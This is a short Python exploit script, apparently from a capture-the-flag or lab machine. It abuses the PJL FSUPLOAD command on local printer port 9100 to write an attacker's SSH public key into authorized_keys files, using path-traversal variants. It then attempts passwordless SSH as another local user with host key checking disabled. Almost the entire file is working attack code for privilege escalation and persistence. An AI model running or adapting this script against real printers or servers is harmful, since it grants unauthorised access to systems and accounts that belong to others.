#!/usr/bin/env python3
"""Single-shot upload + local ssh test (run as lp on target)."""
import os
import socket
import subprocess

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"


def fsupload(name: str) -> str:
    hdr = f'@PJL FSUPLOAD NAME="{name}"\r\nSIZE={len(KEY)}\r\n'.encode()
    s = socket.socket()
    s.settimeout(6)
    s.connect(("127.0.0.1", 9100))
    s.sendall(hdr + KEY)
    try:
        r = s.recv(512)
        out = repr(r)
    except socket.timeout:
        out = "TIMEOUT"
    s.close()
    return out


def main() -> None:
    os.makedirs("/tmp/lpssh", exist_ok=True)
    env = {
        **os.environ,
        "HOME": "/tmp/lpssh",
        "SSH_AUTH_SOCK": "",
    }
    for path in ("authorized_keys", "../.ssh/authorized_keys", ".ssh/authorized_keys"):
        print("upload", path, fsupload(path))
    for cmd in (
        ["ssh", "-F", "/dev/null", "-o", "UserKnownHostsFile=/dev/null",
         "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
         "-o", "ConnectTimeout=3", "archivist@127.0.0.1", "id"],
    ):
        p = subprocess.run(cmd, capture_output=True, text=True, env=env)
        print("ssh", p.stdout.strip(), p.stderr.strip()[:200])


if __name__ == "__main__":
    main()